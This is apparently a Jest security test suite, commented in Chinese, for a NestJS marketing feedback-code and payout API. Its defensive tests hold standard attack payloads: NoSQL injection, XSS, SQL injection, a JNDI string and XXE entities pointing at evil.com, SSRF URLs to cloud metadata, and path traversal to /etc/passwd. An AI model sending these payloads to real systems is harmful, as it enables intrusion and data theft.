import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import { MongooseModule } from '@nestjs/mongoose';
import { MongoMemoryServer } from 'mongodb-memory-server';
import * as request from 'supertest';
import { MarketingModule } from '../../apps/app-gateway/src/marketing/marketing.module';

describe('Marketing Security Tests', () => {
  let app: INestApplication;
  let mongod: MongoMemoryServer;

  beforeAll(async () => {
    mongod = await MongoMemoryServer.create();
    const mongoUri = mongod.getUri();

    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [
        MongooseModule.forRoot(mongoUri),
        MarketingModule,
      ],
    }).compile();

    app = moduleFixture.createNestApplication();
    
    // Enable security features
    app.enableCors();
    
    await app.init();
  });

  afterAll(async () => {
    await app.close();
    await mongod.stop();
  });

  describe('SQL/NoSQL注入防护测试', () => {
    it('应该防止NoSQL注入攻击', async () => {
      // 测试MongoDB注入尝试
      const maliciousPayloads = [
        { code: { '$gt': '' } },
        { code: { '$regex': '.*' } },
        { code: { '$where': 'return true;' } },
        { alipayAccount: { '$ne': null } },
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .send(payload);

        // 应该被拒绝或安全处理
        expect([400, 422, 500]).toContain(response.status);
      }
    });

    it('应该安全处理特殊字符输入', async () => {
      const specialCharInputs = [
        'FB<script>alert("xss")</script>123',
        'FB${jndi:ldap://evil.com/a}',
        'FB\'; DROP TABLE feedback_codes; --',
        'FB\x00\x01\x02\x03',
      ];

      for (const maliciousCode of specialCharInputs) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .send({ code: maliciousCode });

        // 应该被安全处理，不应该执行恶意代码
        if (response.status === 201) {
          // 如果接受了输入，确保已被适当清理
          expect(response.body.data.code).not.toContain('<script>');
          expect(response.body.data.code).not.toContain('${jndi:');
          expect(response.body.data.code).not.toContain('DROP TABLE');
        }
      }
    });
  });

  describe('XSS防护测试', () => {
    it('应该防止反射型XSS攻击', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .get(`/api/marketing/feedback-codes/validate/${encodeURIComponent(payload)}`);

        // 确保响应中没有未转义的脚本
        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('javascript:');
          expect(responseText).not.toContain('onerror=');
          expect(responseText).not.toContain('onload=');
        }
      }
    });

    it('应该安全处理用户输入的问卷数据', async () => {
      const feedbackCode = 'FB_SECURITY_TEST_123';
      
      // 先创建反馈码
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: feedbackCode });

      // 提交包含XSS的问卷数据
      const maliciousQuestionnaireData = {
        code: feedbackCode,
        alipayAccount: 'test@example.com',
        questionnaireData: {
          problems: '<script>alert("problems XSS")</script>这是问题反馈',
          favorite_features: '<img src=x onerror=alert("features XSS")>这是喜欢的功能',
          improvements: 'javascript:alert("improvements XSS")',
          additional_features: '<svg onload=alert("additional XSS")>额外功能建议',
        }
      };

      const response = await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/mark-used')
        .send(maliciousQuestionnaireData);

      // 确保XSS代码被安全处理
      if (response.status === 200) {
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
        expect(responseText).not.toContain('<svg');
      }
    });
  });

  describe('认证与授权测试', () => {
    it('应该要求管理员API的有效JWT令牌', async () => {
      // 测试未认证访问管理员API
      const adminEndpoints = [
        '/api/marketing/admin/pending-payments',
        '/api/marketing/admin/approve-payment',
        '/api/marketing/admin/batch-approve',
        '/api/marketing/admin/dashboard',
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app.getHttpServer())
          .get(endpoint);

        // 应该返回401未授权
        expect(response.status).toBe(401);
      }
    });

    it('应该拒绝无效的JWT令牌', async () => {
      const invalidTokens = [
        'Bearer invalid.token.here',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature',
        'Bearer ' + 'a'.repeat(500), // 过长的token
        'InvalidPrefix token',
        '',
      ];

      for (const token of invalidTokens) {
        const response = await request(app.getHttpServer())
          .get('/api/marketing/admin/dashboard')
          .set('Authorization', token);

        expect([401, 403]).toContain(response.status);
      }
    });

    it('应该验证JWT令牌的完整性', async () => {
      // 测试被篡改的JWT令牌
      const tamperedTokens = [
        // 修改头部
        'eyJ0eXAiOiJOT1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.invalid',
        // 修改负载
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJBRE1JTiIsIm5hbWUiOiJFdmlsIEFkbWluIiwiYWRtaW4iOnRydWV9.invalid',
        // 空签名
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
      ];

      for (const token of tamperedTokens) {
        const response = await request(app.getHttpServer())
          .get('/api/marketing/admin/dashboard')
          .set('Authorization', `Bearer ${token}`);

        expect([401, 403]).toContain(response.status);
      }
    });
  });

  describe('输入验证与限制测试', () => {
    it('应该限制请求体大小', async () => {
      // 创建一个过大的请求体
      const oversizedData = {
        code: 'FB_OVERSIZE_TEST',
        alipayAccount: 'test@example.com',
        questionnaireData: {
          problems: 'A'.repeat(50000), // 50KB文本
          favorite_features: 'B'.repeat(50000),
          improvements: 'C'.repeat(50000),
          additional_features: 'D'.repeat(50000),
        }
      };

      const response = await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/mark-used')
        .send(oversizedData);

      // 应该拒绝过大的请求
      expect([400, 413, 422]).toContain(response.status);
    });

    it('应该实施速率限制', async () => {
      const requests = [];
      const feedbackCode = 'FB_RATE_LIMIT_TEST';

      // 快速连续发送多个请求
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app.getHttpServer())
            .post('/api/marketing/feedback-codes/record')
            .send({ code: `${feedbackCode}_${i}` })
        );
      }

      const responses = await Promise.all(requests);
      
      // 至少有一些请求应该被速率限制拒绝
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('应该验证反馈码格式', async () => {
      const invalidCodes = [
        '', // 空字符串
        'A', // 太短
        'INVALID_FORMAT_WITHOUT_FB_PREFIX',
        'FB', // 只有前缀
        'FB' + 'X'.repeat(100), // 太长
        null,
        undefined,
        123, // 数字类型
        { invalid: 'object' }, // 对象类型
      ];

      for (const invalidCode of invalidCodes) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .send({ code: invalidCode });

        expect([400, 422]).toContain(response.status);
      }
    });

    it('应该验证支付宝账号格式', async () => {
      const feedbackCode = 'FB_ALIPAY_VALIDATION_TEST';
      
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: feedbackCode });

      const invalidAlipayAccounts = [
        '', // 空字符串
        'invalid-format',
        '123', // 太短
        'not-an-email-or-phone',
        '@invalid.com', // 无效邮箱
        '1234567890123456789', // 过长的号码
        null,
        undefined,
      ];

      for (const invalidAccount of invalidAlipayAccounts) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/mark-used')
          .send({
            code: feedbackCode,
            alipayAccount: invalidAccount,
            questionnaireData: { problems: 'test' }
          });

        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('数据泄漏防护测试', () => {
    it('不应该在错误消息中泄漏敏感信息', async () => {
      // 尝试访问不存在的反馈码
      const response = await request(app.getHttpServer())
        .get('/api/marketing/feedback-codes/validate/NONEXISTENT_CODE');

      const responseText = JSON.stringify(response.body);
      
      // 确保错误消息中不包含数据库结构或内部信息
      expect(responseText).not.toContain('mongodb://');
      expect(responseText).not.toContain('SELECT');
      expect(responseText).not.toContain('INSERT');
      expect(responseText).not.toContain('DELETE');
      expect(responseText).not.toContain('feedback_codes');
      expect(responseText).not.toContain('stack trace');
      expect(responseText).not.toContain('Error:');
    });

    it('不应该通过时间攻击泄漏信息', async () => {
      const validCode = 'FB_TIMING_ATTACK_VALID';
      const invalidCode = 'FB_TIMING_ATTACK_INVALID';

      // 创建一个有效的反馈码
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: validCode });

      // 测量验证有效和无效反馈码的响应时间
      const validStartTime = process.hrtime.bigint();
      await request(app.getHttpServer())
        .get(`/api/marketing/feedback-codes/validate/${validCode}`);
      const validEndTime = process.hrtime.bigint();

      const invalidStartTime = process.hrtime.bigint();
      await request(app.getHttpServer())
        .get(`/api/marketing/feedback-codes/validate/${invalidCode}`);
      const invalidEndTime = process.hrtime.bigint();

      const validDuration = Number(validEndTime - validStartTime) / 1000000; // 转换为毫秒
      const invalidDuration = Number(invalidEndTime - invalidStartTime) / 1000000;

      // 响应时间差不应该太大（防止时间攻击）
      const timeDifference = Math.abs(validDuration - invalidDuration);
      expect(timeDifference).toBeLessThan(50); // 50ms 以内的差异是可接受的
    });
  });

  describe('HTTPS与传输安全测试', () => {
    it('应该设置适当的安全响应头', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/marketing/feedback-codes/stats');

      // 检查安全响应头（注意：这些可能需要在生产环境中配置）
      const headers = response.headers;
      
      // 这些头部应该在生产环境中存在
      // expect(headers['x-content-type-options']).toBe('nosniff');
      // expect(headers['x-frame-options']).toBeDefined();
      // expect(headers['x-xss-protection']).toBeDefined();
      
      // 确保没有泄漏服务器信息
      expect(headers['x-powered-by']).toBeUndefined();
      expect(headers['server']).not.toContain('Express');
      expect(headers['server']).not.toContain('nginx');
    });
  });

  describe('会话安全测试', () => {
    it('应该安全处理会话数据', async () => {
      // 测试会话劫持防护
      const response = await request(app.getHttpServer())
        .get('/api/marketing/feedback-codes/stats')
        .set('Cookie', 'session=malicious_session_id');

      // 不应该接受未经验证的会话
      expect([200, 401, 403]).toContain(response.status);
      
      if (response.status === 200) {
        // 如果接受了请求，确保没有基于恶意会话提供特权访问
        expect(response.body).toBeDefined();
      }
    });
  });

  describe('API安全测试', () => {
    it('应该正确处理CORS预检请求', async () => {
      const response = await request(app.getHttpServer())
        .options('/api/marketing/feedback-codes/record')
        .set('Origin', 'https://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Content-Type');

      // 应该根据CORS配置处理预检请求
      expect([200, 204, 404]).toContain(response.status);
    });

    it('应该验证Content-Type', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .set('Content-Type', 'application/xml') // 错误的Content-Type
        .send('<?xml version="1.0"?><root><code>FB123</code></root>');

      // 应该拒绝不支持的Content-Type
      expect([400, 415]).toContain(response.status);
    });

    it('应该防止HTTP方法篡改', async () => {
      const methodOverrideAttempts = [
        { header: 'X-HTTP-Method-Override', value: 'DELETE' },
        { header: 'X-HTTP-Method', value: 'PUT' },
        { header: 'X-Method-Override', value: 'PATCH' }
      ];

      for (const attempt of methodOverrideAttempts) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .set(attempt.header, attempt.value)
          .send({ code: 'FB_METHOD_OVERRIDE_TEST' });

        // 应该忽略方法覆盖头部
        expect(response.status).not.toBe(405); // 不应该是Method Not Allowed
      }
    });

    it('应该限制HTTP请求头大小', async () => {
      const hugeHeaderValue = 'A'.repeat(10000); // 10KB header
      
      const response = await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .set('X-Custom-Header', hugeHeaderValue)
        .send({ code: 'FB_HEADER_SIZE_TEST' });

      // 应该拒绝过大的请求头
      expect([400, 413, 431]).toContain(response.status);
    });
  });

  describe('高级安全威胁防护测试', () => {
    it('应该防止XML外部实体(XXE)攻击', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><code>&xxe;</code></root>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious">]><root><code>&xxe;</code></root>',
        '<!DOCTYPE html [<!ENTITY % xxe SYSTEM "file:///etc/hosts"> %xxe;]>'
      ];

      for (const payload of xxePayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .set('Content-Type', 'application/xml')
          .send(payload);

        // 应该拒绝XML输入或安全处理
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    it('应该防止服务器端请求伪造(SSRF)攻击', async () => {
      const ssrfPayloads = [
        { code: 'FB_SSRF', webhook: 'http://169.254.169.254/metadata' }, // AWS metadata
        { code: 'FB_SSRF', webhook: 'http://127.0.0.1:6379/info' }, // Redis
        { code: 'FB_SSRF', webhook: 'http://localhost:3306/mysql' }, // MySQL
        { code: 'FB_SSRF', webhook: 'file:///etc/passwd' }, // 本地文件
        { code: 'FB_SSRF', webhook: 'ftp://internal.company.com/data' } // 内网FTP
      ];

      for (const payload of ssrfPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/webhook/questionnaire')
          .send(payload);

        // 应该拒绝可疑的内部URL
        if (response.status === 200) {
          expect(response.body.success).toBe(false);
        } else {
          expect([400, 403, 422]).toContain(response.status);
        }
      }
    });

    it('应该防止路径遍历攻击', async () => {
      const pathTraversalCodes = [
        '../../../etc/passwd',
        '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '/var/www/../../etc/passwd'
      ];

      for (const maliciousCode of pathTraversalCodes) {
        const response = await request(app.getHttpServer())
          .get(`/api/marketing/feedback-codes/validate/${encodeURIComponent(maliciousCode)}`);

        // 应该被安全处理，不允许路径遍历
        expect(response.status).not.toBe(200); // 不应该成功访问
        expect([400, 404, 422]).toContain(response.status);
      }
    });
  });

  describe('业务逻辑安全测试', () => {
    it('应该防止竞争条件攻击', async () => {
      const feedbackCode = 'FB_RACE_CONDITION_TEST';
      
      // 先创建反馈码
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: feedbackCode });

      // 同时发送多个使用请求
      const concurrentRequests = [];
      for (let i = 0; i < 5; i++) {
        concurrentRequests.push(
          request(app.getHttpServer())
            .post('/api/marketing/feedback-codes/mark-used')
            .send({
              code: feedbackCode,
              alipayAccount: `test${i}@example.com`,
              questionnaireData: { problems: 'test' }
            })
        );
      }

      const responses = await Promise.all(concurrentRequests);
      
      // 只有一个请求应该成功
      const successfulResponses = responses.filter(res => res.status === 200);
      expect(successfulResponses.length).toBe(1);
      
      // 其他请求应该失败
      const failedResponses = responses.filter(res => res.status !== 200);
      expect(failedResponses.length).toBe(4);
    });

    it('应该防止批量枚举攻击', async () => {
      const startTime = Date.now();
      const attempts = [];
      
      // 尝试枚举大量反馈码
      for (let i = 0; i < 20; i++) {
        attempts.push(
          request(app.getHttpServer())
            .get(`/api/marketing/feedback-codes/validate/FB_ENUM_${i}`)
        );
      }

      const responses = await Promise.all(attempts);
      const endTime = Date.now();
      
      // 检查是否实施了速率限制或延迟响应
      const duration = endTime - startTime;
      expect(duration).toBeGreaterThan(1000); // 至少1秒延迟
      
      // 或者检查是否有请求被速率限制拒绝
      const rateLimitedCount = responses.filter(res => res.status === 429).length;
      expect(rateLimitedCount).toBeGreaterThan(0);
    });

    it('应该防止支付金额篡改', async () => {
      const feedbackCode = 'FB_PAYMENT_TAMPER_TEST';
      
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: feedbackCode });

      // 尝试篡改支付相关参数
      const tamperAttempts = [
        {
          code: feedbackCode,
          alipayAccount: 'test@example.com',
          paymentAmount: 99999, // 尝试设置高额支付
          qualityScore: 5, // 尝试直接设置高质量分
          questionnaireData: { problems: 'test' }
        },
        {
          code: feedbackCode,
          alipayAccount: 'test@example.com',
          paymentStatus: 'approved', // 尝试直接设置为已批准
          questionnaireData: { problems: 'test' }
        }
      ];

      for (const attempt of tamperAttempts) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/mark-used')
          .send(attempt);

        // 应该忽略客户端提供的支付相关参数
        if (response.status === 200) {
          expect(response.body.data.paymentAmount).toBeLessThan(100); // 正常支付金额
          expect(response.body.data.paymentStatus).not.toBe('approved');
        }
      }
    });
  });

  describe('密码学和加密安全测试', () => {
    it('应该使用安全的随机数生成', async () => {
      const codes = [];
      
      // 生成多个反馈码检查随机性
      for (let i = 0; i < 10; i++) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .send({ code: `FB_RANDOM_TEST_${i}` });
          
        if (response.status === 201) {
          codes.push(response.body.data.id);
        }
      }

      // 检查生成的ID是否具有足够的熵
      const uniqueIds = new Set(codes);
      expect(uniqueIds.size).toBe(codes.length); // 所有ID应该唯一
      
      // 检查是否存在明显的模式
      for (let i = 1; i < codes.length; i++) {
        expect(codes[i]).not.toBe(codes[i-1]); // 连续ID不应相同
      }
    });

    it('应该安全处理敏感数据', async () => {
      const feedbackCode = 'FB_SENSITIVE_DATA_TEST';
      const sensitiveAlipay = 'sensitive_account@example.com';
      
      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: feedbackCode });

      await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/mark-used')
        .send({
          code: feedbackCode,
          alipayAccount: sensitiveAlipay,
          questionnaireData: {
            problems: '这里包含了我的身份证号：123456789012345678',
            improvements: '我的手机号是：13800138000'
          }
        });

      // 检查敏感信息是否出现在日志或响应中
      const statsResponse = await request(app.getHttpServer())
        .get('/api/marketing/feedback-codes/stats');

      const responseText = JSON.stringify(statsResponse.body);
      expect(responseText).not.toContain('123456789012345678');
      expect(responseText).not.toContain('13800138000');
      expect(responseText).not.toContain(sensitiveAlipay);
    });
  });

  describe('错误处理和异常安全测试', () => {
    it('应该安全处理数据库错误', async () => {
      // 停止MongoDB模拟服务器来触发数据库错误
      await mongod.stop();
      
      const response = await request(app.getHttpServer())
        .post('/api/marketing/feedback-codes/record')
        .send({ code: 'FB_DB_ERROR_TEST' });

      // 应该返回通用错误，不暴露数据库细节
      expect([500, 503]).toContain(response.status);
      
      const errorText = JSON.stringify(response.body);
      expect(errorText).not.toContain('mongodb');
      expect(errorText).not.toContain('connection');
      expect(errorText).not.toContain('ECONNREFUSED');
      expect(errorText).not.toContain('localhost');
      
      // 重新启动MongoDB用于后续测试
      mongod = await MongoMemoryServer.create();
      // 注意：这里需要重新配置应用的数据库连接
    });

    it('应该限制错误信息的详细程度', async () => {
      const malformedRequests = [
        { invalidJson: 'this is not json' },
        null,
        undefined,
        '',
        { code: null },
        { code: {} },
        { code: [] }
      ];

      for (const malformedData of malformedRequests) {
        const response = await request(app.getHttpServer())
          .post('/api/marketing/feedback-codes/record')
          .send(malformedData);

        // 错误响应不应该包含系统内部信息
        const errorText = JSON.stringify(response.body);
        expect(errorText).not.toMatch(/Error:\s*at\s+/); // 不应包含堆栈跟踪
        expect(errorText).not.toContain('ValidationError');
        expect(errorText).not.toContain(__dirname); // 不应包含文件路径
      }
    });
  });
});